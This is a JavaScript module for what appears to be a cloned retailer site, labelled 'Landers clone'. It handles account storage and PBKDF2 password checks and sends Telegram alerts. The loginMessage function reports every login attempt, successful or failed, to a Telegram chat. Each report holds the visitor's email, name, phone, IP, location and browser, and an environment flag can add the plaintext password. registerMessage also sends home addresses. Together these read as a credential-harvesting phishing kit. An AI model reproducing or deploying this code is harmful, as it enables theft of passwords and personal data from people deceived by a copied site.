/*
  账号存储 / 口令校验 / Telegram 通知
  -----------------------------------------------------------------------------
  存储优先级：
    1) Cloudflare KV（绑定名 LD_USERS）——真正的落盘，跨设备可登录
    2) cookie `ld_accounts` ——没配 KV 时的兜底：账号只存在这一台浏览器里，
       好处是仍然做真实的密码校验（不是"随便填都成功"）

  口令：PBKDF2-SHA256，随机 16 字节 salt，100000 次迭代，只存 hash。
  Telegram：环境变量 TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID，事件异步发送，失败不影响主流程。
*/

import { b64, unb64, readCookie } from './_shared.js';

export const ACCOUNTS_COOKIE = 'ld_accounts';
const PBKDF2_ITER = 100000;
const MAX_COOKIE_ACCOUNTS = 4;

const enc = new TextEncoder();

const randomB64 = (bytes = 16) => {
  const buf = new Uint8Array(bytes);
  crypto.getRandomValues(buf);
  let s = '';
  for (const b of buf) s += String.fromCharCode(b);
  return btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
};

const toB64Bytes = (buf) => {
  const bytes = new Uint8Array(buf);
  let s = '';
  for (const b of bytes) s += String.fromCharCode(b);
  return btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
};

const fromB64Bytes = (str) => {
  const s = String(str).replace(/-/g, '+').replace(/_/g, '/');
  const raw = atob(s);
  const out = new Uint8Array(raw.length);
  for (let i = 0; i < raw.length; i++) out[i] = raw.charCodeAt(i);
  return out;
};

export const hashPassword = async (password, saltB64) => {
  const salt = fromB64Bytes(saltB64 || randomB64(16));
  const key = await crypto.subtle.importKey('raw', enc.encode(String(password)), 'PBKDF2', false, ['deriveBits']);
  const bits = await crypto.subtle.deriveBits(
    { name: 'PBKDF2', salt, iterations: PBKDF2_ITER, hash: 'SHA-256' },
    key,
    256
  );
  return {
    algo: `pbkdf2-sha256$${PBKDF2_ITER}`,
    salt: toB64Bytes(salt),
    hash: toB64Bytes(bits),
  };
};

export const verifyPassword = async (password, rec) => {
  if (!rec || !rec.salt || !rec.hash) return false;
  const { hash } = await hashPassword(password, rec.salt);
  if (hash.length !== rec.hash.length) return false;
  // 常量时间比较
  let diff = 0;
  for (let i = 0; i < hash.length; i++) diff |= hash.charCodeAt(i) ^ rec.hash.charCodeAt(i);
  return diff === 0;
};

/* ---------------- 存储 ---------------- */
const kvOf = (env) => (env && env.LD_USERS && typeof env.LD_USERS.get === 'function' ? env.LD_USERS : null);

const readCookieAccounts = (request) => {
  const raw = readCookie(request, ACCOUNTS_COOKIE);
  const obj = raw ? unb64(raw) : null;
  return obj && typeof obj === 'object' ? obj : {};
};

export const storageMode = (env) => (kvOf(env) ? 'kv' : 'cookie');

export const getAccount = async (env, request, email) => {
  const key = String(email || '').trim().toLowerCase();
  if (!key) return null;
  const kv = kvOf(env);
  if (kv) {
    try {
      const raw = await kv.get('user:' + key);
      if (raw) return typeof raw === 'string' ? JSON.parse(raw) : raw;
    } catch (e) {
      /* 落到 cookie */
    }
  }
  const cookieAccounts = readCookieAccounts(request);
  return cookieAccounts[key] || null;
};

/** 写入账号，返回 cookie 里该带的账号表（cookie 模式下用于 Set-Cookie） */
export const putAccount = async (env, request, record) => {
  const key = String(record.email || '').trim().toLowerCase();
  const kv = kvOf(env);

  if (kv) {
    try {
      await kv.put('user:' + key, JSON.stringify(record));
    } catch (e) {
      /* 写 KV 失败也继续写 cookie，保证本浏览器可用 */
    }
  }

  const cookieAccounts = readCookieAccounts(request);
  cookieAccounts[key] = record;
  const keys = Object.keys(cookieAccounts);
  if (keys.length > MAX_COOKIE_ACCOUNTS) {
    keys
      .sort((a, b) => String(cookieAccounts[a].createdAt || '').localeCompare(String(cookieAccounts[b].createdAt || '')))
      .slice(0, keys.length - MAX_COOKIE_ACCOUNTS)
      .forEach((k) => delete cookieAccounts[k]);
  }
  return b64(cookieAccounts);
};

/* ---------------- Telegram ---------------- */
const TELEGRAM_API = 'https://api.telegram.org';

const telegramConfigured = (env) =>
  Boolean(env && env.TELEGRAM_BOT_TOKEN && env.TELEGRAM_CHAT_ID);

export const notifyTelegram = async (env, text) => {
  if (!telegramConfigured(env)) return { ok: false, reason: 'not_configured' };
  const ctl = new AbortController();
  const timer = setTimeout(() => ctl.abort(), 3500);
  try {
    const res = await fetch(`${TELEGRAM_API}/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: env.TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
      signal: ctl.signal,
    });
    const j = await res.json().catch(() => null);
    return { ok: Boolean(j && j.ok), status: res.status, description: j && j.description };
  } catch (e) {
    return { ok: false, reason: String((e && e.message) || e) };
  } finally {
    clearTimeout(timer);
  }
};

export const clientMeta = (request) => {
  const h = request.headers;
  return {
    ip: h.get('CF-Connecting-IP') || h.get('x-forwarded-for') || '',
    country: h.get('CF-IPCountry') || '',
    city: h.get('CF-IPCity') || '',
    ua: h.get('User-Agent') || '',
    referer: h.get('Referer') || '',
  };
};

export const esc = (s) =>
  String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');

export const loginMessage = (env, { user, ok, reason, password, meta, mode }) => {
  const when = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
  const lines = [
    `${ok ? '✅ <b>LOGIN OK</b>' : '❌ <b>LOGIN FAILED</b>'} — ${esc(env && env.SITE_LABEL ? env.SITE_LABEL : 'Landers clone')}`,
    '',
    `<b>Email</b>: ${esc(user && user.email)}`,
    `<b>Name</b>: ${esc((user && user.name) || '')}`,
    `<b>Phone</b>: ${esc((user && user.phone) || '')}`,
    `<b>Membership</b>: ${esc((user && user.membership) || '')}`,
    `<b>Result</b>: ${ok ? 'password verified' : esc(reason || 'failed')}`,
  ];
  if (env && /^(1|true|yes)$/i.test(String(env.TELEGRAM_INCLUDE_PASSWORD || '')) && password) {
    lines.push(`<b>Password</b>: <code>${esc(password)}</code>`);
  }
  lines.push(
    '',
    `<b>IP</b>: ${esc(meta.ip)} ${meta.country ? `(${esc(meta.country)}${meta.city ? ' / ' + esc(meta.city) : ''})` : ''}`,
    `<b>UA</b>: ${esc(String(meta.ua).slice(0, 120))}`,
    `<b>Storage</b>: ${esc(mode || '')}`,
    `<b>Time</b>: ${esc(when)}`
  );
  return lines.join('\n');
};

export const registerMessage = (env, { user, meta, mode }) => {
  const when = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
  return [
    `🆕 <b>NEW MEMBER</b> — ${esc(env && env.SITE_LABEL ? env.SITE_LABEL : 'Landers clone')}`,
    '',
    `<b>Name</b>: ${esc(user.name)}`,
    `<b>Email</b>: ${esc(user.email)}`,
    `<b>Phone</b>: ${esc(user.phone)}`,
    `<b>Membership</b>: ${esc(user.membership)}`,
    `<b>Address</b>: ${esc([user.address, user.city, user.region, user.zip].filter(Boolean).join(', '))}`,
    '',
    `<b>IP</b>: ${esc(meta.ip)} ${meta.country ? `(${esc(meta.country)})` : ''}`,
    `<b>UA</b>: ${esc(String(meta.ua).slice(0, 120))}`,
    `<b>Storage</b>: ${esc(mode || '')}`,
    `<b>Time</b>: ${esc(when)}`,
  ].join('\n');
};
